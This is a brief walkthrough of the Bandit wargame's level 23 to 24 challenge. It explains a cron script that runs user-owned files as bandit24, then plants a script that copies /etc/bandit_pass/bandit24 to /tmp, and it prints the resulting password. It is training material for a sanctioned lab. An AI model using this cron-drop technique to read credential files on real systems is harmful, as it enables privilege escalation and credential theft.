# Bandit Level 23 -> Level 24:

Here we look at the script that is run by the cronjob of bandit24:

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

In really short, what this does is, it deletes all files in `/var/spool/$myname/foo` and if a file's owner is bandit23, then it runs the script before it deletes it. So what we can do, is write a script that copies the bandit24's password to a location that we can read, which will then get executed as bandit24.

```bash
bandit23@bandit:~$ vi /tmp/script
bandit23@bandit:~$ cat /tmp/script
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
bandit23@bandit:~$ cp /tmp/script /var/spool/bandit24/foo/
bandit23@bandit:~$ cat /tmp/bandit24_password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
